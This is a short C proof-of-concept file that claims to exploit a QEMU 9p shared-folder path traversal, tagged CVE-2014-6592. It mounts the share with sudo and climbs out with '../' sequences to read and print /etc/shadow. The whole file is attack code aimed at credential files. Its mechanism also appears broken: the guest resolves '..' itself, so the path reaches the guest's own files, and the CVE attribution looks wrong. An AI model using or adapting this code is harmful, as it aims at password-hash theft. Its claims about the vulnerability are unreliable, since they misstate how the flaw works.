/*
 * C PoC for QEMU 9pfs Path Traversal
 * CVE-2014-6592
 *
 * Uses mount(2) to attach a 9p share, then constructs a ../
 * sequence to escape the share's root and read an arbitrary
 * host file from the guest.
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <fcntl.h>

#define SHARE_NAME  "hostshare"
#define MOUNT_POINT "/mnt/9p"
#define HOST_FILE   "/etc/shadow"

int main() {
    char cmd[256], path[512];
    int fd, n;
    char buf[1024];

    // 1) Mount the 9p share
    snprintf(cmd, sizeof(cmd),
             "mount | grep -q '9p on %s' || "
             "sudo mount -t 9p -o trans=virtio,version=9p2000.L "
             "%s %s",
             MOUNT_POINT, SHARE_NAME, MOUNT_POINT);
    if (system(cmd) != 0) {
        perror("mount 9p");
        return 1;
    }
    printf("[+] Mounted 9p share %s at %s\n", SHARE_NAME, MOUNT_POINT);

    // 2) Build a path that climbs above the share root
    //    e.g., /mnt/9p/../../../../etc/shadow
    snprintf(path, sizeof(path),
             "%s/%s", MOUNT_POINT,
             "../../../../../../../../etc/shadow");
    printf("[+] Attempting to open host file via %s\n", path);

    fd = open(path, O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    // 3) Read and dump a bit of host file
    n = read(fd, buf, sizeof(buf)-1);
    if (n > 0) {
        buf[n] = '\0';
        printf("[+] Leaked data:\n%s\n", buf);
    }
    close(fd);
    return 0;
}